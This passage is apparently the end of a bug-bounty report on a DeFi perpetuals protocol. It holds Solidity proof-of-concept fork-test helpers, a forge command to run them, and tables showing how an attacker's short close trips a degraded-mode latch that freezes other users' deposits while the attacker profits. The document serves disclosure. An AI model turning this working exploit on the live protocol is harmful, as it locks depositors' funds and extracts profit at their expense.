        emit log_named_decimal_uint("ordinary SHORT notional added (USDG)", _lots(ORGANIC_SHORT) * ENGINE.lastMarkPrice(), 6);
        emit log_named_decimal_uint("attacker SHORT notional (USDG)", _lots(ATTACKER) * ENGINE.lastMarkPrice(), 6);
        emit log_named_decimal_uint("LONG aggregate max profit = L (USDG)", longMaxProfit, 6);
        emit log_named_decimal_uint("SHORT aggregate max profit (USDG)", shortMaxProfit, 6);
        emit log_named_decimal_uint("pool assets with the full book (USDG)", POOL.totalAssets(), 6);
        emit log_named_decimal_int(
            "headroom E - L (USDG)",
            int256(POOL.totalAssets() - ENGINE.totalTraderClaimBalanceAssets()) - int256(longMaxProfit),
            6
        );
        assertFalse(ENGINE.degradedMode(), "book itself latched");
    }

    /// @dev Interleaved opens until the LONG side reaches `longTarget` and the SHORT side `shortTarget` (max-profit
    ///      totals). While the SHORT side is below `attackerShortCap`, SHORT chunks go to `attacker`; otherwise to
    ///      `shortAccount`. Each chunk opens on the lighter side, so |skew| stays below one chunk.
    function _fill(
        address longAccount,
        address shortAccount,
        address attacker,
        uint256 longTarget,
        uint256 shortTarget,
        uint256 attackerShortCap
    ) internal {
        for (uint256 i; i < 40; ++i) {
            (uint256 longMaxProfit, uint256 longOi,,) = ENGINE.sides(uint256(CfdTypes.Side.LONG));
            (uint256 shortMaxProfit, uint256 shortOi,,) = ENGINE.sides(uint256(CfdTypes.Side.SHORT));
            bool longOpen = longMaxProfit + 1000e6 < longTarget;
            bool shortOpen = shortMaxProfit + 1000e6 < shortTarget;
            if (!longOpen && !shortOpen) {
                break;
            }
            bool openShort = shortOpen && (!longOpen || longOi >= shortOi);
            uint256 gap = openShort ? shortTarget - shortMaxProfit : longTarget - longMaxProfit;
            address account = openShort ? shortAccount : longAccount;
            if (openShort && attacker != address(0) && shortMaxProfit + 1000e6 < attackerShortCap) {
                account = attacker;
                if (attackerShortCap - shortMaxProfit < gap) {
                    gap = attackerShortCap - shortMaxProfit;
                }
            }
            if (gap > MAX_CHUNK_PROFIT) {
                gap = MAX_CHUNK_PROFIT;
            }
            uint256 price = ENGINE.lastMarkPrice();
            uint256 perLot = openShort ? ENGINE.CAP_PRICE() - price : price;
            uint256 lots = gap / perLot;
            _open(account, openShort ? CfdTypes.Side.SHORT : CfdTypes.Side.LONG, lots);
        }
    }

    function _logLatch() internal returns (uint256 shortfall, uint256 liability) {
        (liability,,,) = ENGINE.sides(uint256(CfdTypes.Side.LONG));
        uint256 effective = POOL.totalAssets() - ENGINE.totalTraderClaimBalanceAssets();
        assertLt(effective, liability, "E >= L");
        shortfall = liability - effective;
        emit log_named_decimal_uint("pool assets after the close (USDG)", POOL.totalAssets(), 6);
        emit log_named_decimal_uint("max liability L after the close (USDG)", liability, 6);
        emit log_named_decimal_uint("raw shortfall L - E (USDG)", shortfall, 6);
    }

    function _requestVictimDeposits() internal returns (uint256 seniorRequest, uint256 juniorRequest) {
        seniorEscrowBase = SENIOR_VAULT.pendingDepositEscrowAssets();
        juniorEscrowBase = JUNIOR_VAULT.pendingDepositEscrowAssets();
        _deal(SENIOR_DEPOSITOR, SENIOR_DEPOSIT);
        vm.startPrank(SENIOR_DEPOSITOR);
        USDG.approve(address(SENIOR_VAULT), SENIOR_DEPOSIT);
        seniorRequest = SENIOR_VAULT.requestDeposit(SENIOR_DEPOSIT, SENIOR_DEPOSITOR, SENIOR_DEPOSITOR);
        vm.stopPrank();
        _deal(JUNIOR_DEPOSITOR, JUNIOR_DEPOSIT);
        vm.startPrank(JUNIOR_DEPOSITOR);
        USDG.approve(address(JUNIOR_VAULT), JUNIOR_DEPOSIT);
        juniorRequest = JUNIOR_VAULT.requestDeposit(JUNIOR_DEPOSIT, JUNIOR_DEPOSITOR, JUNIOR_DEPOSITOR);
        vm.stopPrank();
    }

    function _warpToMaturity(
        uint256 juniorRequest
    ) internal {
        uint256 maturity = JUNIOR_VAULT.depositEpochStart(juniorRequest);
        if (vm.getBlockTimestamp() < maturity) {
            vm.warp(maturity);
        }
    }

    function _holdAndAssertFrozen(
        uint256 seniorRequest,
        uint256 juniorRequest,
        uint256 moveBps,
        uint256 duration
    ) internal {
        _assertDepositsFrozen(seniorRequest, juniorRequest, moveBps);
        uint256 end = vm.getBlockTimestamp() + duration;
        while (vm.getBlockTimestamp() < end) {
            uint256 next = vm.getBlockTimestamp() + 1 hours;
            vm.warp(next > end ? end : next);
            _refreshMark(moveBps);
            (uint256 liability,,,) = ENGINE.sides(uint256(CfdTypes.Side.LONG));
            emit log_named_decimal_int(
                "  hour mark: E - L (USDG)",
                int256(POOL.totalAssets() - ENGINE.totalTraderClaimBalanceAssets()) - int256(liability),
                6
            );
            _assertDepositsFrozen(seniorRequest, juniorRequest, moveBps);
        }
    }

    function _assertDepositsFrozen(
        uint256 seniorRequest,
        uint256 juniorRequest,
        uint256 moveBps
    ) internal {
        assertTrue(ENGINE.degradedMode(), "latch cleared");
        assertEq(SENIOR_VAULT.claimableDepositRequest(seniorRequest, SENIOR_DEPOSITOR), 0, "senior activated");
        assertEq(JUNIOR_VAULT.claimableDepositRequest(juniorRequest, JUNIOR_DEPOSITOR), 0, "junior activated");
        assertEq(SENIOR_VAULT.pendingDepositEscrowAssets(), seniorEscrowBase + SENIOR_DEPOSIT, "senior escrow moved");
        assertEq(JUNIOR_VAULT.pendingDepositEscrowAssets(), juniorEscrowBase + JUNIOR_DEPOSIT, "junior escrow moved");

        vm.prank(SENIOR_DEPOSITOR);
        vm.expectRevert(bytes4(keccak256("TrancheVault__SeniorDepositCommitted()")));
        SENIOR_VAULT.cancelPendingDeposit(seniorRequest);
        vm.prank(JUNIOR_DEPOSITOR);
        vm.expectRevert(bytes4(keccak256("TrancheVault__DepositEpochAlreadyActive()")));
        JUNIOR_VAULT.cancelPendingDeposit(juniorRequest);

        _nextBlock();
        bytes[] memory tick = _ticks(moveBps, vm.getBlockTimestamp(), ENGINE.lastMarkTime());
        vm.prank(JUNIOR_DEPOSITOR);
        vm.expectRevert(bytes4(keccak256("HousePool__DegradedMode()")));
        ROUTER.settleLpEpoch(tick);

        vm.prank(OWNER);
        vm.expectRevert(bytes4(keccak256("CfdEngine__StillInsolvent()")));
        ENGINE.clearDegradedMode();
    }

    // --- Router helpers (public V3 path) ---

    function _open(
        address account,
        CfdTypes.Side side,
        uint256 lots
    ) internal {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = keccak256(abi.encode("open", account, ++orderNonce));
        request.side = side;
        request.sizeDelta = lots * CfdTypes.SIZE_QUANTUM;
        request.marginDelta = lots * ENGINE.lastMarkPrice() * MARGIN_BPS / 10_000;
        request.targetPrice = side == CfdTypes.Side.LONG ? 1 : ENGINE.CAP_PRICE();
        request.bounds = _bounds();
        vm.prank(account);
        uint64 orderId = ROUTER.commitOrder(request);
        OrderV3Types.ExecutionResult memory result = _executeAt(KEEPER, orderId, 0);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "open failed");
        _refreshMark(0);
    }

    function _closeAll(
        address account,
        CfdTypes.Side side,
        uint256 moveBps
    ) internal {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = keccak256(abi.encode("close", account, ++orderNonce));
        request.side = side;
        (request.sizeDelta,,,,,,) = ENGINE.positions(account);
        request.targetPrice = side == CfdTypes.Side.LONG ? ENGINE.CAP_PRICE() : 1;
        request.isClose = true;
        request.bounds = _bounds();
        vm.prank(account);
        uint64 orderId = ROUTER.commitOrder(request);
        OrderV3Types.ExecutionResult memory result = _executeAt(account, orderId, moveBps);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "close failed");
        assertEq(_lots(account), 0, "position not closed");
    }

    function _settleViaRouter(
        uint256 moveBps
    ) internal {
        _nextBlock();
        bytes[] memory tick = _ticks(moveBps, vm.getBlockTimestamp(), ENGINE.lastMarkTime());
        vm.prank(KEEPER);
        ROUTER.settleLpEpoch(tick);
    }

    function _bounds() internal view returns (OrderV3Types.ExecutionBounds memory bounds) {
        bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: 1 | 2 | 4,
            expectedConfigHash: ROUTER.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _executeAt(
        address keeper,
        uint64 orderId,
        uint256 moveBps
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        uint64 commitTime = ROUTER.lifecycleBook().orderTiming(orderId).commitTimestamp;
        uint256 publishTime = uint256(commitTime) + 1;
        if (vm.getBlockTimestamp() < publishTime) {
            vm.warp(publishTime);
        }
        _nextBlock();
        bytes[] memory tick = _ticks(moveBps, publishTime, commitTime);
        vm.prank(keeper);
        result = ROUTER.executeOrder(orderId, tick);
    }

    /// @dev Signed-update stand-in for all six basket feeds at the live prices, moved by `moveBps` (Pyth mock only).
    ///      Direct feeds scale up and inverted feeds scale down, so every basket component moves by the same factor.
    function _ticks(
        uint256 moveBps,
        uint256 publishTime,
        uint256 previousPublishTime
    ) internal view returns (bytes[] memory updateData) {
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](feedIds.length);
        for (uint256 i; i < feedIds.length; ++i) {
            uint256 p = uint256(uint64(livePrices[i]));
            p = inverted[i] ? p * 10_000 / (10_000 + moveBps) : p * (10_000 + moveBps) / 10_000;
            ticks[i] = MockPyth.FeedUpdate(
                feedIds[i], MockPyth.MockPrice(int64(uint64(p)), 0, -8, publishTime, previousPublishTime)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _refreshMark(
        uint256 moveBps
    ) internal {
        if (vm.getBlockTimestamp() <= ENGINE.lastMarkTime()) {
            vm.warp(uint256(ENGINE.lastMarkTime()) + 1);
        }
        _nextBlock();
        ROUTER.updateMarkPrice(_ticks(moveBps, vm.getBlockTimestamp(), ENGINE.lastMarkTime()));
    }

    function _nextBlock() internal {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
    }

    // --- Utilities ---

    function _deal(
        address to,
        uint256 amount
    ) internal {
        deal(address(USDG), to, USDG.balanceOf(to) + amount);
    }

    function _fund(
        address account,
        uint256 amount
    ) internal {
        _deal(account, amount);
        vm.startPrank(account);
        USDG.approve(address(CLEARINGHOUSE), amount);
        CLEARINGHOUSE.deposit(account, amount);
        vm.stopPrank();
    }

    function _lots(
        address account
    ) internal view returns (uint256) {
        (uint256 size,,,,,,) = ENGINE.positions(account);
        return size / CfdTypes.SIZE_QUANTUM;
    }

    function _toExpoMinus8(
        int64 price,
        int32 expo
    ) internal pure returns (int64) {
        if (expo == -8) {
            return price;
        }
        if (expo > -8) {
            return int64(int256(price) * int256(10 ** uint256(int256(expo + 8))));
        }
        return int64(int256(price) / int256(10 ** uint256(int256(-8 - expo))));
    }

}
```

</details>

### Observed balances:

Run with `ARBITRUM_SEPOLIA_RPC_URL=<RPC> FORK_BLOCK=325848265 forge test --root packages/perps --match-contract DegradedLatchDepositFreezeForkPoC -vv` (3 tests pass). All amounts are USDG with six decimals.

**Main scenario: the attacker is only a smaller-side trader in a pool that ordinary demand has filled**

| Measurement | Value on the fork |
| --- | ---: |
| Live pool assets before any order | 102,058,191.066798 |
| Live LONG / SHORT aggregate max profit before any order | 15,974,921.589514 / 213,721.762594 |
| Live basket mark price | 0.97024565 |
| Ordinary LONG / SHORT notional added | 85,818,518.816195 / 59,263,477.523085 |
| Attacker SHORT notional (smaller side, 4% margin) | 28,773,216.898140 |
| LONG aggregate max profit = `L` | 101,793,440.405709 |
| SHORT aggregate max profit (incl. the attacker) | 93,650,027.341369 |
| Pool assets with the full book | 102,054,993.554737 |
| Cushion `E − L` before the close (`B` = 254,483.60) | 261,553.149028 |
| Basket move before the attacker's close | +1.50% |
| Pool assets after the attacker's close | 101,716,492.565752 |
| `L` after the close (unchanged) | 101,793,440.405709 |
| Raw shortfall `L − E` that latches the flag | 76,947.839957 |
| Attacker position after the close | none |
| `E − L` at each of the 24 hourly checks | −76,947.839957 (unchanged) |
| Senior deposit in escrow, cancel reverts `TrancheVault__SeniorDepositCommitted` | 100,000.000000 |
| Junior deposit in escrow (matured), cancel reverts `TrancheVault__DepositEpochAlreadyActive` | 200,000.000000 |
| `OrderRouter.settleLpEpoch` by a depositor | Reverts `HousePool__DegradedMode` every hour |
| Owner `clearDegradedMode` while `E < L` | Reverts `CfdEngine__StillInsolvent` every hour |
| Freeze duration of other users' 300,000 USDG | 86,404 s |
| Attacker net on-chain result | +331,844.785908 |
| — price gain on its SHORT | +431,600.485056 |
| — execution fees and net VPI paid | −99,755.699148 |
| Owner injection needed (`recapitalizePool`) | 76,948.839957 |
| Settlement after the injection and `clearDegradedMode` | Reverts `HousePool__NoLpEpochProgress` |
| Settlement after the owner's `assignUnassignedAssets` | Activates both deposits (100,000 and 200,000 claimable) |

**Control** (same full book and deposits at +1.50%, no attacker close): `degradedMode` stays false, and one settlement activates both deposits.

**Worst case** (pool not full; the attacker fills the capacity itself with a hedged pair, then +1.00%)

| Measurement | Value on the fork |
| --- | ---: |
| Attacker LONG / SHORT notional | 85,777,962.548025 / 95,671,266.367380 |
| Pool assets after the winning-leg close | 101,644,150.810128 |
| `L` after the close | 101,752,884.137539 |
| Raw shortfall `L − E` | 108,733.327411 |
| `E − L` at each of the 24 hourly checks | −108,733.327411 (unchanged) |
| Attacker total cost | 584,819.105510 |
| — execution fees to the treasury | 107,233.987493 |
